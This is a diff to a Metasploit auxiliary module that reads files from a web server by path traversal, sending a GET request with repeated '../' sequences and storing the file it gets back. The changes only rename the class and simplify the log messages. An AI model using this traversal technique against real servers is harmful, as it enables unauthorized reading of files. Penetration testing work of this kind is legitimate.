@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -51,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
     peer = "#{ip}:#{rport}"
     fname = datastore['FILE']
 
-    print_status("#{peer} - Reading '#{datastore['FILE']}'")
+    print_status("Reading '#{datastore['FILE']}'")
     traverse = "../" * datastore['DEPTH']
     res = send_request_cgi({
       'method'   => 'GET',
@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
     if res and res.code == 500 and res.body =~ /Error report/
-      print_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
+      print_error("Cannot obtain '#{fname}', here are some possible reasons:")
       print_error("\t1. File does not exist.")
       print_error("\t2. The server does not have any patches deployed.")
       print_error("\t3. Your 'DEPTH' option isn't deep enough.")
@@ -80,10 +80,10 @@ class Metasploit3 < Msf::Auxiliary
       )
 
       vprint_line(data)
-      print_good("#{peer} - #{fname} stored as '#{p}'")
+      print_good("#{fname} stored as '#{p}'")
 
     else
-      print_error("#{peer} - Fail to obtain file for some unknown reason")
+      print_error("Fail to obtain file for some unknown reason")
     end
   end
 
